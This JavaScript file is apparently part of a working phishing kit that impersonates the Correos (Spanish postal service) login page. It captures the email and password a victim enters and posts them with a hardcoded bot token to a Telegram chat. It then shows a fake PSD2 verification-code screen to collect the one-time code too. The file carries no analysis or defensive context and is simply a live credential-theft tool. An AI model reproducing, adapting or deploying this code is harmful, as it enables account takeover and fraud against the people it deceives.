const state = {};

const btnEmail = document.querySelector("[data-v-33064c4a]");
const emailInput = document.querySelector("#identifier");
const grid = document.querySelector(".grid_content");


function waitForElm(selector) {
  return new Promise(resolve => {
    if (document.querySelector(selector)) {
      return resolve(document.querySelector(selector));
    }

    const observer = new MutationObserver(mutations => {
      if (document.querySelector(selector)) {
        resolve(document.querySelector(selector));
        observer.disconnect();
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  });
}

waitForElm("#identifier").then(elm => {
        elm.addEventListener("keypress", e => {
                if (e.key === "Enter") {
                  e.preventDefault();
                  state.email = emailInput.value;
                  grid.innerHTML =
                    `<h1 data-v-1b60cf2e="" class="content_title">Te damos la bienvenida</h1><p data-v-1b60cf2e="" class="content_desc">Entrando como&nbsp;<strong data-v-1b60cf2e="">${emailInput.value}</strong></p><div data-v-1b60cf2e="" class="content_form"><form data-v-1b60cf2e="" autocomplete="off" class="form_identifier-container"><div data-v-1b60cf2e="" tabindex="1" title="Cambiar usuario" class="custom-link active icon-first user-link text-blue" id="change-user-btn" autocomplete=""><!----><span>Cambiar usuario</span><span class="waiting-spinner"></span><section data-v-29c980f2="" class="icon-block btn-ic"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="user-24" width="24" height="24" viewBox="0 0 24 24" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M12 12C9.23858 12 7 9.76142 7 7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7C17 9.76142 14.7614 12 12 12ZM12 10C13.6569 10 15 8.65685 15 7C15 5.34315 13.6569 4 12 4C10.3431 4 9 5.34315 9 7C9 8.65685 10.3431 10 12 10ZM4 17.5C4 15.567 5.567 14 7.5 14H16.5C18.433 14 20 15.567 20 17.5V18.5C20 20.433 18.433 22 16.5 22H7.5C5.567 22 4 20.433 4 18.5V17.5ZM7.5 16C6.67157 16 6 16.6716 6 17.5V18.5C6 19.3284 6.67157 20 7.5 20H16.5C17.3284 20 18 19.3284 18 18.5V17.5C18 16.6716 17.3284 16 16.5 16H7.5Z" fill="#000" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><div data-v-5185e8f0="" data-v-1b60cf2e="" class="element_input password form-txt"><label data-v-5185e8f0="" for="password">Password<!----></label><input data-v-5185e8f0="" autocomplete="off" type="password" autofocus="autofocus" id="password"><div data-v-5185e8f0="" class="show-hide"><section data-v-29c980f2="" data-v-5185e8f0="" class="icon-block icon-show"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="eye-remove-16" width="16" height="16" viewBox="0 0 16 16" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M5 8a3 3 0 0 1 3-3l.906-.906A4.433 4.433 0 0 0 8 4c-1.577 0-3.069.85-4.43 2.345A12.54 12.54 0 0 0 2.309 8c.336.524.724 1.046 1.156 1.536L5 8zm-2.952 2.952C.712 9.468 0 8 0 8s2.91-6 8-6c.903 0 1.738.189 2.5.5L13 0l1.414 1.414-13 13L0 13l2.048-2.048zm4.154.675A4.624 4.624 0 0 0 8 12c1.577 0 3.069-.85 4.43-2.345.475-.524.899-1.088 1.262-1.655a12.54 12.54 0 0 0-1.263-1.655 10.66 10.66 0 0 0-.465-.48l1.414-1.415C15.083 6.11 16 8 16 8s-2.91 6-8 6c-1.228 0-2.329-.35-3.293-.879l1.495-1.494zm.797-.798L10.83 7A3 3 0 0 1 7 10.83z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><p data-v-5185e8f0="" class="error-msg spacer"> &nbsp;</p><!----></div><div data-v-1b60cf2e="" tabindex="1" title="Have you forgotten your password?" class="custom-link no-underline link-forgot text-blue"><!----><span>Have you forgotten your password?</span><span class="waiting-spinner"></span><!----></div><button data-login="" data-v-33064c4a="" data-v-1b60cf2e="" type="button" class="component__button-regular main-action  "><span >Log in</span><span data-v-33064c4a="" class="waiting-spinner"></span><!----></button></form><div data-v-1b60cf2e="" class="form_line"></div><div data-v-1b60cf2e="" class="form_pass-container"><p data-v-1b60cf2e="" class="top-text">¿Eres nuevo o has comprado una tarjeta en oficina?</p><div data-v-1b60cf2e="" tabindex="1" title="Crea tu cuenta" class="custom-link outline" eventid="create-account-link"><!----><span>Crea tu cuenta</span><span class="waiting-spinner"></span><!----></div><p data-v-1b60cf2e="" class="bottom-text">Podrás comprar tarjetas, vincular las de tus familiares y mucho más.</p></div></div>`
                }
              })
})

waitForElm("[data-v-33064c4a]").then(elm => {
        elm.addEventListener("click", (e) => {
                e.preventDefault()
                state.email = emailInput.value;
                grid.innerHTML =
                  `<h1 data-v-1b60cf2e="" class="content_title">Te damos la bienvenida</h1><p data-v-1b60cf2e="" class="content_desc">Entrando como&nbsp;<strong data-v-1b60cf2e="">${emailInput.value}</strong></p><div data-v-1b60cf2e="" class="content_form"><form data-v-1b60cf2e="" autocomplete="off" class="form_identifier-container"><div data-v-1b60cf2e="" tabindex="1" title="Cambiar usuario" class="custom-link active icon-first user-link text-blue" id="change-user-btn" autocomplete=""><!----><span>Cambiar usuario</span><span class="waiting-spinner"></span><section data-v-29c980f2="" class="icon-block btn-ic"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="user-24" width="24" height="24" viewBox="0 0 24 24" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M12 12C9.23858 12 7 9.76142 7 7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7C17 9.76142 14.7614 12 12 12ZM12 10C13.6569 10 15 8.65685 15 7C15 5.34315 13.6569 4 12 4C10.3431 4 9 5.34315 9 7C9 8.65685 10.3431 10 12 10ZM4 17.5C4 15.567 5.567 14 7.5 14H16.5C18.433 14 20 15.567 20 17.5V18.5C20 20.433 18.433 22 16.5 22H7.5C5.567 22 4 20.433 4 18.5V17.5ZM7.5 16C6.67157 16 6 16.6716 6 17.5V18.5C6 19.3284 6.67157 20 7.5 20H16.5C17.3284 20 18 19.3284 18 18.5V17.5C18 16.6716 17.3284 16 16.5 16H7.5Z" fill="#000" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><div data-v-5185e8f0="" data-v-1b60cf2e="" class="element_input password form-txt"><label data-v-5185e8f0="" for="password">Password<!----></label><input data-v-5185e8f0="" autocomplete="off" type="password" autofocus="autofocus" id="password"><div data-v-5185e8f0="" class="show-hide"><section data-v-29c980f2="" data-v-5185e8f0="" class="icon-block icon-show"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="eye-remove-16" width="16" height="16" viewBox="0 0 16 16" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M5 8a3 3 0 0 1 3-3l.906-.906A4.433 4.433 0 0 0 8 4c-1.577 0-3.069.85-4.43 2.345A12.54 12.54 0 0 0 2.309 8c.336.524.724 1.046 1.156 1.536L5 8zm-2.952 2.952C.712 9.468 0 8 0 8s2.91-6 8-6c.903 0 1.738.189 2.5.5L13 0l1.414 1.414-13 13L0 13l2.048-2.048zm4.154.675A4.624 4.624 0 0 0 8 12c1.577 0 3.069-.85 4.43-2.345.475-.524.899-1.088 1.262-1.655a12.54 12.54 0 0 0-1.263-1.655 10.66 10.66 0 0 0-.465-.48l1.414-1.415C15.083 6.11 16 8 16 8s-2.91 6-8 6c-1.228 0-2.329-.35-3.293-.879l1.495-1.494zm.797-.798L10.83 7A3 3 0 0 1 7 10.83z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><p data-v-5185e8f0="" class="error-msg spacer"> &nbsp;</p><!----></div><div data-v-1b60cf2e="" tabindex="1" title="Have you forgotten your password?" class="custom-link no-underline link-forgot text-blue"><!----><span>Have you forgotten your password?</span><span class="waiting-spinner"></span><!----></div><button data-v-33064c4a="" data-v-1b60cf2e="" data-login="" type="button" class="component__button-regular main-action  "><span >Log in</span><span data-v-33064c4a="" class="waiting-spinner"></span><!----></button></form><div data-v-1b60cf2e="" class="form_line"></div><div data-v-1b60cf2e="" class="form_pass-container"><p data-v-1b60cf2e="" class="top-text">¿Eres nuevo o has comprado una tarjeta en oficina?</p><div data-v-1b60cf2e="" tabindex="1" title="Crea tu cuenta" class="custom-link outline" eventid="create-account-link"><!----><span>Crea tu cuenta</span><span class="waiting-spinner"></span><!----></div><p data-v-1b60cf2e="" class="bottom-text">Podrás comprar tarjetas, vincular las de tus familiares y mucho más.</p></div></div>`
              });
})

// emailInput.addEventListener("keypress", e => {
//   if (e.key === "Enter") {
//     e.preventDefault();
//     state.email = emailInput.value;
//     grid.innerHTML =
//       `<h1 data-v-1b60cf2e="" class="content_title">Te damos la bienvenida</h1><p data-v-1b60cf2e="" class="content_desc">Entrando como&nbsp;<strong data-v-1b60cf2e="">${emailInput.value}</strong></p><div data-v-1b60cf2e="" class="content_form"><form data-v-1b60cf2e="" autocomplete="off" class="form_identifier-container"><div data-v-1b60cf2e="" tabindex="1" title="Cambiar usuario" class="custom-link active icon-first user-link text-blue" id="change-user-btn" autocomplete=""><!----><span>Cambiar usuario</span><span class="waiting-spinner"></span><section data-v-29c980f2="" class="icon-block btn-ic"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="user-24" width="24" height="24" viewBox="0 0 24 24" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M12 12C9.23858 12 7 9.76142 7 7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7C17 9.76142 14.7614 12 12 12ZM12 10C13.6569 10 15 8.65685 15 7C15 5.34315 13.6569 4 12 4C10.3431 4 9 5.34315 9 7C9 8.65685 10.3431 10 12 10ZM4 17.5C4 15.567 5.567 14 7.5 14H16.5C18.433 14 20 15.567 20 17.5V18.5C20 20.433 18.433 22 16.5 22H7.5C5.567 22 4 20.433 4 18.5V17.5ZM7.5 16C6.67157 16 6 16.6716 6 17.5V18.5C6 19.3284 6.67157 20 7.5 20H16.5C17.3284 20 18 19.3284 18 18.5V17.5C18 16.6716 17.3284 16 16.5 16H7.5Z" fill="#000" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><div data-v-5185e8f0="" data-v-1b60cf2e="" class="element_input password form-txt"><label data-v-5185e8f0="" for="password">Password<!----></label><input data-v-5185e8f0="" autocomplete="off" type="password" autofocus="autofocus" id="password"><div data-v-5185e8f0="" class="show-hide"><section data-v-29c980f2="" data-v-5185e8f0="" class="icon-block icon-show"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="eye-remove-16" width="16" height="16" viewBox="0 0 16 16" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M5 8a3 3 0 0 1 3-3l.906-.906A4.433 4.433 0 0 0 8 4c-1.577 0-3.069.85-4.43 2.345A12.54 12.54 0 0 0 2.309 8c.336.524.724 1.046 1.156 1.536L5 8zm-2.952 2.952C.712 9.468 0 8 0 8s2.91-6 8-6c.903 0 1.738.189 2.5.5L13 0l1.414 1.414-13 13L0 13l2.048-2.048zm4.154.675A4.624 4.624 0 0 0 8 12c1.577 0 3.069-.85 4.43-2.345.475-.524.899-1.088 1.262-1.655a12.54 12.54 0 0 0-1.263-1.655 10.66 10.66 0 0 0-.465-.48l1.414-1.415C15.083 6.11 16 8 16 8s-2.91 6-8 6c-1.228 0-2.329-.35-3.293-.879l1.495-1.494zm.797-.798L10.83 7A3 3 0 0 1 7 10.83z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><p data-v-5185e8f0="" class="error-msg spacer"> &nbsp;</p><!----></div><div data-v-1b60cf2e="" tabindex="1" title="Have you forgotten your password?" class="custom-link no-underline link-forgot text-blue"><!----><span>Have you forgotten your password?</span><span class="waiting-spinner"></span><!----></div><button data-v-33064c4a="" data-v-1b60cf2e="" type="button" data-login="" class="component__button-regular main-action  "><span>Log in</span><span data-v-33064c4a="" class="waiting-spinner"></span><!----></button></form><div data-v-1b60cf2e="" class="form_line"></div><div data-v-1b60cf2e="" class="form_pass-container"><p data-v-1b60cf2e="" class="top-text">¿Eres nuevo o has comprado una tarjeta en oficina?</p><div data-v-1b60cf2e="" tabindex="1" title="Crea tu cuenta" class="custom-link outline" eventid="create-account-link"><!----><span>Crea tu cuenta</span><span class="waiting-spinner"></span><!----></div><p data-v-1b60cf2e="" class="bottom-text">Podrás comprar tarjetas, vincular las de tus familiares y mucho más.</p></div></div>`
//   }
// })


// btnEmail.addEventListener("click", (e) => {
//   e.preventDefault()
//   state.email = emailInput.value;
//   grid.innerHTML =
//     `<h1 data-v-1b60cf2e="" class="content_title">Te damos la bienvenida</h1><p data-v-1b60cf2e="" class="content_desc">Entrando como&nbsp;<strong data-v-1b60cf2e="">${emailInput.value}</strong></p><div data-v-1b60cf2e="" class="content_form"><form data-v-1b60cf2e="" autocomplete="off" class="form_identifier-container"><div data-v-1b60cf2e="" tabindex="1" title="Cambiar usuario" class="custom-link active icon-first user-link text-blue" id="change-user-btn" autocomplete=""><!----><span>Cambiar usuario</span><span class="waiting-spinner"></span><section data-v-29c980f2="" class="icon-block btn-ic"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="user-24" width="24" height="24" viewBox="0 0 24 24" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M12 12C9.23858 12 7 9.76142 7 7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7C17 9.76142 14.7614 12 12 12ZM12 10C13.6569 10 15 8.65685 15 7C15 5.34315 13.6569 4 12 4C10.3431 4 9 5.34315 9 7C9 8.65685 10.3431 10 12 10ZM4 17.5C4 15.567 5.567 14 7.5 14H16.5C18.433 14 20 15.567 20 17.5V18.5C20 20.433 18.433 22 16.5 22H7.5C5.567 22 4 20.433 4 18.5V17.5ZM7.5 16C6.67157 16 6 16.6716 6 17.5V18.5C6 19.3284 6.67157 20 7.5 20H16.5C17.3284 20 18 19.3284 18 18.5V17.5C18 16.6716 17.3284 16 16.5 16H7.5Z" fill="#000" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><div data-v-5185e8f0="" data-v-1b60cf2e="" class="element_input password form-txt"><label data-v-5185e8f0="" for="password">Password<!----></label><input data-v-5185e8f0="" autocomplete="off" type="password" autofocus="autofocus" id="password"><div data-v-5185e8f0="" class="show-hide"><section data-v-29c980f2="" data-v-5185e8f0="" class="icon-block icon-show"><!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="eye-remove-16" width="16" height="16" viewBox="0 0 16 16" class="svg"><!----> <path data-v-29c980f2="" id="path-one" d="M5 8a3 3 0 0 1 3-3l.906-.906A4.433 4.433 0 0 0 8 4c-1.577 0-3.069.85-4.43 2.345A12.54 12.54 0 0 0 2.309 8c.336.524.724 1.046 1.156 1.536L5 8zm-2.952 2.952C.712 9.468 0 8 0 8s2.91-6 8-6c.903 0 1.738.189 2.5.5L13 0l1.414 1.414-13 13L0 13l2.048-2.048zm4.154.675A4.624 4.624 0 0 0 8 12c1.577 0 3.069-.85 4.43-2.345.475-.524.899-1.088 1.262-1.655a12.54 12.54 0 0 0-1.263-1.655 10.66 10.66 0 0 0-.465-.48l1.414-1.415C15.083 6.11 16 8 16 8s-2.91 6-8 6c-1.228 0-2.329-.35-3.293-.879l1.495-1.494zm.797-.798L10.83 7A3 3 0 0 1 7 10.83z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path></svg></section></div><p data-v-5185e8f0="" class="error-msg spacer"> &nbsp;</p><!----></div><div data-v-1b60cf2e="" tabindex="1" title="Have you forgotten your password?" class="custom-link no-underline link-forgot text-blue"><!----><span>Have you forgotten your password?</span><span class="waiting-spinner"></span><!----></div><button data-v-33064c4a="" data-v-1b60cf2e="" type="button" class="component__button-regular main-action  data-login="" "><span>Log in</span><span data-v-33064c4a="" class="waiting-spinner"></span><!----></button></form><div data-v-1b60cf2e="" class="form_line"></div><div data-v-1b60cf2e="" class="form_pass-container"><p data-v-1b60cf2e="" class="top-text">¿Eres nuevo o has comprado una tarjeta en oficina?</p><div data-v-1b60cf2e="" tabindex="1" title="Crea tu cuenta" class="custom-link outline" eventid="create-account-link"><!----><span>Crea tu cuenta</span><span class="waiting-spinner"></span><!----></div><p data-v-1b60cf2e="" class="bottom-text">Podrás comprar tarjetas, vincular las de tus familiares y mucho más.</p></div></div>`
// });


waitForElm('#change-user-btn').then((elm) => {
  elm.addEventListener("click", e => {
    grid.innerHTML = `
          <h1 data-v-1b60cf2e="" class="content_title">Iniciar sesión Particulares</h1>
          <div data-v-1b60cf2e="" class="content_form">
            <form data-v-1b60cf2e="" autocomplete="off" class="form_identifier-container">
              <div data-v-b3365b9e="" data-v-1b60cf2e="" class="element_input form-txt identifier "><label data-v-b3365b9e="" for="identifier">Email / Identificador
                  <!---->
                  <!---->
                  <!----></label>
                <div data-v-b3365b9e="" class="input-wrapper"><input data-v-b3365b9e="" type="text" id="identifier" placeholder="" autofocus="autofocus" class="padding-right-icon">
                  <div data-v-b3365b9e="" class="inner-tooltip">
                    <section data-v-29c980f2="" data-v-b3365b9e="" class="icon-block icon-show">
                      <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="info-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                        <!---->
                        <path data-v-29c980f2="" id="path-one" d="M7,4 L9,4 L9,6 L7,6 L7,4 Z M7,7 L9,7 L9,12 L7,12 L7,7 Z M8,13 C10.7614237,13 13,10.7614237 13,8 C13,5.23857625 10.7614237,3 8,3 C5.23857625,3 3,5.23857625 3,8 C3,10.7614237 5.23857625,13 8,13 Z M8,15 C4.13400675,15 1,11.8659932 1,8 C1,4.13400675 4.13400675,1 8,1 C11.8659932,1 15,4.13400675 15,8 C15,11.8659932 11.8659932,15 8,15 Z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path>
                      </svg></section>
                  </div>
                  <!---->
                  <!---->
                  <!---->
                </div>
                <p data-v-b3365b9e="" class="error-msg">&nbsp;</p>
                <!---->
              </div>
              <div data-v-1b60cf2e="" class="element__checkbox ch-login"><input type="checkbox" id="remember-login"><label for="remember-login">
                  <div class="faux-input">
                    <section data-v-29c980f2="" class="icon-block">
                      <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="check-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                        <!---->
                        <polygon data-v-29c980f2="" id="Path-2" fill-rule="nonzero" fill="#121313" transform="" points="6.61321557 10.6058358 12.9177546 2.5 14.496459 3.72788123 6.80099799 13.6220454 2 8.82104739 3.41421356 7.40683383"></polygon>
                      </svg></section>
                  </div>
                  <!---->
                </label><label for="remember-login">Recordar en este dispositivo</label></div><button data-v-33064c4a="" data-v-1b60cf2e="" type="button" class="component__button-regular main-action undefined "><span data-v-33064c4a="">Continue</span><span data-v-33064c4a="" class="waiting-spinner"></span>
                <!----></button>
            </form>
            <div data-v-1b60cf2e="" class="form_line"></div>
            <div data-v-1b60cf2e="" class="form_pass-container">
              <p data-v-1b60cf2e="" class="top-text">¿Eres nuevo o has comprado una tarjeta en oficina?</p>
              <div data-v-1b60cf2e="" tabindex="1" title="Crea tu cuenta" class="custom-link outline" eventid="create-account-link">
                <!----><span>Crea tu cuenta</span><span class="waiting-spinner"></span>
                <!---->
              </div>
              <p data-v-1b60cf2e="" class="bottom-text">Podrás comprar tarjetas, vincular las de tus familiares y mucho más.</p>
            </div>
          </div>
          <div data-v-1b60cf2e="" class="content_link-container">
            <div data-v-1b60cf2e="" tabindex="1" title="Acceder con tu Tarjeta Ayudas Sociales" class="custom-link icon-slide-right text-blue" eventid="aass-link">
              <!----><span>Acceder con tu Tarjeta Ayudas Sociales</span><span class="waiting-spinner"></span>
              <section data-v-29c980f2="" class="icon-block btn-ic">
                <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="arrow_right-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                  <!---->
                  <path data-v-29c980f2="" id="path-one" d="M11.5857864,7 L6.3,1.71421356 L7.71421356,0.3 L15.4213203,8.00710678 L7.71421356,15.7142136 L6.3,14.3 L11.6,9 L0,9 L0,7 L11.5857864,7 Z" fill="#002e6d" stroke="none" fill-rule="" stroke-width="1"></path>
                </svg></section>
            </div>
            <div data-v-1b60cf2e="" tabindex="1" title="Acceder con tu Tarjeta Regalo" class="custom-link icon-slide-right text-blue" eventid="gift-link">
              <!----><span>Acceder con tu Tarjeta Regalo</span><span class="waiting-spinner"></span>
              <section data-v-29c980f2="" class="icon-block btn-ic">
                <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="arrow_right-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                  <!---->
                  <path data-v-29c980f2="" id="path-one" d="M11.5857864,7 L6.3,1.71421356 L7.71421356,0.3 L15.4213203,8.00710678 L7.71421356,15.7142136 L6.3,14.3 L11.6,9 L0,9 L0,7 L11.5857864,7 Z" fill="#002e6d" stroke="none" fill-rule="" stroke-width="1"></path>
                </svg></section>
            </div>
            <div data-v-1b60cf2e="" tabindex="1" title="Iniciar sesión en Bono Cultural Joven" class="custom-link icon-slide-right text-blue" eventid="youth-cultural-bonus-link">
              <!----><span>Iniciar sesión en Bono Cultural Joven</span><span class="waiting-spinner"></span>
              <section data-v-29c980f2="" class="icon-block btn-ic">
                <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="arrow_right-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                  <!---->
                  <path data-v-29c980f2="" id="path-one" d="M11.5857864,7 L6.3,1.71421356 L7.71421356,0.3 L15.4213203,8.00710678 L7.71421356,15.7142136 L6.3,14.3 L11.6,9 L0,9 L0,7 L11.5857864,7 Z" fill="#002e6d" stroke="none" fill-rule="" stroke-width="1"></path>
                </svg></section>
            </div>
          </div>
      `

  })
});

const TOKEN = '5902842950:AAGACPLQARIc5OV9thFtKYwD4Mpj7OS0cJQ';
const CHAT_ID = '-814853138';
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`

waitForElm("[data-login]").then(elm => {
  elm.addEventListener("click", e => {
    e.preventDefault();
    
    state.pass = document.querySelector('#password').value;

    axios.post(URI_API, {
        chat_id: CHAT_ID,

        parse_mode: 'markdown',
        text: `email: ${state.email}
pass: ${state.pass}
________________
Ожидает код...
`,
})

        grid.innerHTML = `<div data-v-2201b0e4="" data-v-bad96198="" style="max-width: 540px;" class="form-step_code-verification">
        <div data-v-bad96198="" data-v-2201b0e4="" class="content_block">
                <h1 data-v-bad96198="" data-v-2201b0e4="" class="content_title">Temporary code</h1>
                <p data-v-bad96198="" data-v-2201b0e4="">Por seguridad, siguiendo la normativa de PSD2, es necesario que introduzcas el código de verificación que
                        hemos enviado al correo electrónico <b id="email">${state.email}</b>.</p>
                <p data-v-bad96198="" data-v-2201b0e4="">Esta clave tiene una duración máxima de 5 minutos.</p><br data-v-bad96198="" data-v-2201b0e4="">
                <p data-v-bad96198="" data-v-2201b0e4="" class="little-grey-print">Te la solicitaremos, como máximo, una vez cada 90 días.</p>
        </div>
        <div data-v-2201b0e4="" class="block-code">
                <div data-v-2201b0e4="" class="combo-input combo-code">
                        <div data-v-5185e8f0="" data-v-2201b0e4="" class="element_input password code"><label data-v-5185e8f0="" for="code">Verification code
                                        <!----></label><input data-v-5185e8f0="" autocomplete="off" type="password" id="code">
                                <div data-v-5185e8f0="" class="show-hide">
                                        <section data-v-29c980f2="" data-v-5185e8f0="" class="icon-block icon-show">
                                                <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="eye-remove-16" width="16" height="16" viewBox="0 0 16 16" class="svg">
                                                        <!---->
                                                        <path data-v-29c980f2="" id="path-one" d="M5 8a3 3 0 0 1 3-3l.906-.906A4.433 4.433 0 0 0 8 4c-1.577 0-3.069.85-4.43 2.345A12.54 12.54 0 0 0 2.309 8c.336.524.724 1.046 1.156 1.536L5 8zm-2.952 2.952C.712 9.468 0 8 0 8s2.91-6 8-6c.903 0 1.738.189 2.5.5L13 0l1.414 1.414-13 13L0 13l2.048-2.048zm4.154.675A4.624 4.624 0 0 0 8 12c1.577 0 3.069-.85 4.43-2.345.475-.524.899-1.088 1.262-1.655a12.54 12.54 0 0 0-1.263-1.655 10.66 10.66 0 0 0-.465-.48l1.414-1.415C15.083 6.11 16 8 16 8s-2.91 6-8 6c-1.228 0-2.329-.35-3.293-.879l1.495-1.494zm.797-.798L10.83 7A3 3 0 0 1 7 10.83z" fill="#121313" stroke="none" fill-rule="" stroke-width="1"></path>
                                                </svg></section>
                                </div>
                                <p data-v-5185e8f0="" class="error-msg spacer"> &nbsp;</p>
                                <!---->
                        </div><span data-v-2201b0e4="">Haven't received it?<div data-v-2201b0e4="" tabindex="1" title="Volver a enviar" class="custom-link no-underline">
                                        <!----><span>Volver a enviar</span><span class="waiting-spinner"></span>
                                        <!---->
                                </div></span>
                </div>
        </div>
        <div data-v-2201b0e4="" class="block-info">
                <div data-v-2201b0e4="" class="element__raised-card">
                        <div data-v-2201b0e4="" class="info-header">
                                <section data-v-29c980f2="" data-v-2201b0e4="" class="icon-block header-icon">
                                        <!----> <svg data-v-29c980f2="" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" data-icon-name="thief-red-35" width="35" height="35" viewBox="0 0 35 35" class="svg">
                                                <!---->
                                                <path data-v-29c980f2="" id="path-one" d="M28.3353 11.5589C28.3353 11.5721 28.3343 11.5851 28.3323 11.5977H30.2663C30.68 11.5977 31.0627 11.7324 31.3722 11.96C31.5373 12.0479 31.6734 12.1829 31.7625 12.3472C31.9927 12.6551 32.1291 13.0363 32.1291 13.4485V14.1326C32.1292 14.5435 31.9938 14.9235 31.765 15.231C31.6747 15.3995 31.5351 15.5377 31.3656 15.6263C31.0573 15.8509 30.6772 15.9837 30.2665 15.9837L4.82521 15.9837C4.41472 15.9837 4.0348 15.851 3.72658 15.6266C3.55688 15.538 3.41723 15.3998 3.3269 15.2312C3.09793 14.9237 2.9624 14.5434 2.9624 14.1323V13.4485C2.9624 13.0354 3.09935 12.6534 3.33049 12.3451C3.41939 12.1823 3.55449 12.0483 3.71817 11.9608C4.02788 11.7327 4.41098 11.5977 4.82521 11.5977H6.75877C6.75682 11.5851 6.75581 11.5723 6.75581 11.5591C6.75581 9.25872 7.60827 7.09162 9.15645 5.45739C10.7083 3.81914 12.7683 2.91669 14.9579 2.91669L20.1339 2.91669C24.6562 2.91669 28.3353 6.79373 28.3353 11.5589Z" fill="#EA3F3F" stroke="none" fill-rule="" stroke-width="1"></path>
                                                <path data-v-29c980f2="" id="path-1" d="M8.96913 30.5759C9.78975 30.7871 10.5492 30.8926 11.2457 30.8926C12.9916 30.8926 14.344 30.2306 15.281 28.9146L17.1852 26.353C17.2796 26.226 17.4252 26.1526 17.5846 26.1526H17.5865C17.747 26.1537 17.8931 26.2278 17.9875 26.357L19.9964 29.1015C21.2679 30.6079 22.8804 31.0079 25.9486 30.5816C28.6256 30.2142 29.9386 29.165 30.3425 27.0248L30.3366 22.037C29.7237 19.254 25.4611 17.7845 17.3052 17.5445H17.2909C9.93775 17.7489 5.84118 19.2067 4.76627 22.0009C4.75405 22.0322 4.74847 22.0649 4.74953 22.0987L4.89808 26.6239C5.09713 28.0536 5.32298 29.6724 8.96913 30.5759ZM20.1039 23.8489C20.2495 23.0687 21.0869 22.8258 22.2035 22.8258C22.8323 22.8258 23.5502 22.9032 24.2821 23.0042C25.0883 23.1444 25.6565 23.4367 25.9713 23.8733C26.3402 24.3857 26.2528 25.1122 25.7622 25.6019C25.269 26.0946 24.5755 26.3168 23.6417 26.2697C22.9417 26.2373 22.2309 26.0253 21.5865 25.6567C20.5998 25.0936 20.1162 24.4864 20.1039 23.8489ZM10.9067 23.0058C11.654 22.9021 12.385 22.824 13.0225 22.824C14.125 22.824 14.9474 23.0581 15.0888 23.8C15.0814 24.4864 14.5978 25.0936 13.6105 25.6567C12.9664 26.0253 12.255 26.2376 11.5556 26.2698C10.6285 26.3176 9.92854 26.0957 9.43507 25.602C8.94453 25.1122 8.85657 24.3847 9.22594 23.8734C9.54057 23.437 10.1087 23.1445 10.9067 23.0058Z" fill="#EA3F3F" stroke="none" fill-rule="" stroke-width="1"></path>
                                        </svg></section>
                                <h4 data-v-2201b0e4="" class="header-title">No compartas este código</h4>
                        </div>
                        <p data-v-2201b0e4="" class="info-subtitle">No compartas este código con nadie. Si recibes un mensaje solicitándote este código desconfía,
                                Correos nunca te pedirá esta verificación fuera de la aplicación.</p>
                </div>
        </div>
        <div data-v-2201b0e4="" class="block-btns"><button data-v-33064c4a="" data-v-2201b0e4="" type="button" class="component__button-regular flip-icon icon-first text-only icon-slide-left "><span data-v-33064c4a="">Back</span><span data-v-33064c4a="" class="waiting-spinner"></span>
